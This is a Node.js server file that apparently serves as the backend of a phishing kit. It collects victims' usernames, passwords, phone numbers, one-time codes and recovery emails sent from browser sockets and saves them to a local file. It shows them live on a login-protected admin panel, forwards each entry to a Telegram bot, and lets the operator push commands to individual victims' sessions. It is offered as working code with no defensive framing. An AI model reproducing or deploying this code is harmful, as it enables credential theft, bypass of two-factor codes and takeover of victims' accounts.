const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const session = require('express-session');
const axios = require('axios');
const dotenv = require('dotenv');
const path = require('path');
const fs = require('fs');

dotenv.config();

const app = express();
const server = http.createServer(app);
const io = new Server(server); // Required initialization order

const CONFIG_FILE = path.join(__dirname, 'config.json');
let savedLogs = [];

if (fs.existsSync(CONFIG_FILE)) {
    try {
        savedLogs = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
    } catch (e) { console.error("Backup load failed"); }
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: process.env.SESSION_SECRET || 'secret_123',
    resave: false,
    saveUninitialized: true
}));

app.use(express.static(path.join(__dirname, 'public')));
app.get('/health', (req, res) => res.status(200).send('OK'));

const isAdmin = (req, res, next) => {
    if (req.session.authenticated) return next();
    res.redirect('/login');
};

app.get('/login', (req, res) => {
    res.send(`<body style="font-family:sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; height:100vh;">
        <form action="/login" method="POST" style="background:white; padding:30px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
            <h2>Admin Login</h2>
            <input type="text" name="user" placeholder="Username" required style="display:block; width:100%; padding:10px; margin-bottom:10px;">
            <input type="password" name="pass" placeholder="Password" required style="display:block; width:100%; padding:10px; margin-bottom:10px;">
            <button type="submit" style="width:100%; padding:10px; background:#0078d4; color:white; border:none; border-radius:4px; cursor:pointer;">Login</button>
        </form>
    </body>`);
});

app.post('/login', (req, res) => {
    if (req.body.user === "adminn" && req.body.pass === "12345X") {
        req.session.authenticated = true;
        res.redirect('/admin');
    } else { res.send("Invalid. <a href='/login'>Try again</a>"); }
});

app.get('/logout', (req, res) => {
    req.session.destroy(() => res.redirect('/login'));
});

app.get('/admin', isAdmin, (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

io.on('connection', (socket) => {
    const referer = socket.handshake.headers.referer || '';
    if (referer.includes('/admin')) {
        savedLogs.forEach(log => { socket.emit('new_log_entry', log); });
    }

    socket.on('send_logs', async (data) => {
        const logEntry = { id: socket.id, ...data, timestamp: new Date().toLocaleTimeString() };
        savedLogs.push(logEntry);
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(savedLogs, null, 2));
        io.emit('new_log_entry', logEntry);

        try {
            let msg = `🔔 **Step:** ${data.step}\n👤 **User:** ${data.username}\n📍 **IP:** ${data.ipAddress}`;
            if (data.password) msg += `\n🔑 **Pass:** ${data.password}`;
            if (data.phone) msg += `\n📞 **Phone:** ${data.phone}`;
            if (data.otp) msg += `\n🔢 **OTP:** ${data.otp}`;
            if (data.recovery_email) msg += `\n📧 **Recovery:** ${data.recovery_email}`;
            
            if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
                await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: process.env.TELEGRAM_CHAT_ID, text: msg
                });
            }
        } catch (e) { console.error("Telegram fail"); }
    });

    socket.on('delete_log', (data) => {
        savedLogs = savedLogs.filter(log => !(log.timestamp === data.timestamp && log.username === data.username));
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(savedLogs, null, 2));
        io.emit('log_deleted', data);
    });

    socket.on('admin_action', (cmd) => {
        io.to(cmd.targetId).emit('server_command', cmd);
    });
});

server.listen(3000, () => console.log("🚀 Server live on 3000"));